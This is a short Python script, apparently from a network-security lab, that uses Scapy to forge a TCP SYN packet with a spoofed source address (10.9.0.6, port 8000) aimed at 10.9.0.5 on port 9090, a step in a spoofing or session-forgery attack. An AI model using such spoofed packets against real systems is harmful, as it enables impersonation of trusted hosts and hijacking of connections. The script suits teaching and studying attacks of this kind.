#!/usr/bin/python3
from scapy.all import *

x_ip = "10.9.0.5"
x_port = 9090
srv_ip = "10.9.0.6"
srv_port = 8000
syn_seq = 0x1000

print("Sending spoofed SYN")
ip = IP( src=srv_ip, dst=x_ip )
tcp = TCP( sport=srv_port, dport=x_port, seq = syn_seq, flags='S' )

spoofed_syn_pkt = ip/tcp
send( spoofed_syn_pkt, verbose=1 )
